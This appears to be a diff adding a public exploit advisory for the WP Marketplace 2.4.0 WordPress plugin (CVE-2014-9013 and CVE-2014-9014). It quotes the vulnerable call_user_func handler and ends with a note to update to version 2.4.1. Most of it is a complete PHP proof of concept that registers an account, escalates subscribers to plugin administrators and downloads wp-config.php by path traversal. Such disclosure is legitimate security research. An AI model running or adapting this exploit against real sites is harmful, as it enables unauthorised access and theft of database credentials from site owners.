@@ -1,0 +1,117 @@
+# Exploit Title: WP Marketplace 2.4.0 Arbitrary File Download
+# Date: 26-10-2014
+# Software Link: https://wordpress.org/plugins/wpmarketplace/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+# CVE: CVE-2014-9013 and CVE-2014-9014
+
+1. Description
+
+Anyone can run user defined function because of call_user_func.
+
+File: wpmarketplace\libs\cart.php
+
+function ajaxinit(){
+if(isset($_POST['action']) && $_POST['action']=='wpmp_pp_ajax_call'){
+	if(function_exists($_POST['execute']))
+		call_user_func($_POST['execute'],$_POST);
+	else
+		echo __("function not defined!","wpmarketplace");
+	die();
+	}
+}
+
+http://security.szurek.pl/wp-marketplace-240-arbitrary-file-download.html
+
+2. Proof of Concept
+
+$file =  '../../../wp-config.php';
+$url = 'http://wordpress-url/';
+$user = 'userlogin';
+$email = 'useremail@email.email';
+$pass = 'password';
+$cookie = "/cookie.txt";
+
+$ckfile = dirname(__FILE__) . $cookie;
+$cookie = fopen($ckfile, 'w') or die("Cannot create cookie file");
+
+// Register
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url.'?checkout_register=register');
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
+curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch,
+    CURLOPT_POSTFIELDS,
+    array(
+        'register_form' => 'register',
+        'reg[user_login]' => $user,
+        'reg[user_email]' => $email,
+        'reg[user_pass]' => $pass
+    ));
+$content = curl_exec($ch);
+if (!preg_match("/success/i", $content)) {
+    die("Cannot register");
+}
+// Log in
+curl_setopt($ch, CURLOPT_URL, $url.'wp-login.php');
+curl_setopt($ch,
+    CURLOPT_POSTFIELDS,
+    array(
+        'log' => $user,
+        'pwd' => $pass,
+        'wp-submit' => 'Log%20In'
+    ));
+$content = curl_exec($ch);
+if (!preg_match('/adminmenu/i', $content)) {
+    die("Cannot login");
+}
+// Add subscriber as plugin admin
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch,
+    CURLOPT_POSTFIELDS,
+    array(
+        'action' => 'wpmp_pp_ajax_call',
+        'execute' => 'wpmp_save_settings',
+        '_wpmp_settings[user_role][]' => 'subscriber'
+    ));
+$content = curl_exec($ch);
+if (!preg_match('/Settings Saved Successfully/i', $content)) {
+    die("Cannot set role");
+}
+// Request noonce
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch,
+    CURLOPT_POSTFIELDS,
+    array(
+        'action' => 'wpmp_pp_ajax_call',
+        'execute' => 'wpmp_front_add_product'
+    ));
+$content = curl_exec($ch);
+preg_match('/name="__product_wpmp" value="([^"]+)"/i', $content, $nonce);
+if (strlen($nonce[1]) < 2) {
+    die("Cannot get nonce");
+}
+// Set file to download
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch,
+    CURLOPT_POSTFIELDS,
+    array(
+        '__product_wpmp' => $nonce[1],
+        'post_type' => 'wpmarketplace',
+        'id' => '123456',
+        'wpmp_list[base_price]' => '0',
+        'wpmp_list[file][]' => $file
+    ));
+$content = curl_exec($ch);
+header("Location: ".$url."?wpmpfile=123456");
+
+3. Solution:
+
+Update to version 2.4.1
+
+https://downloads.wordpress.org/plugin/wpmarketplace.2.4.1.zip
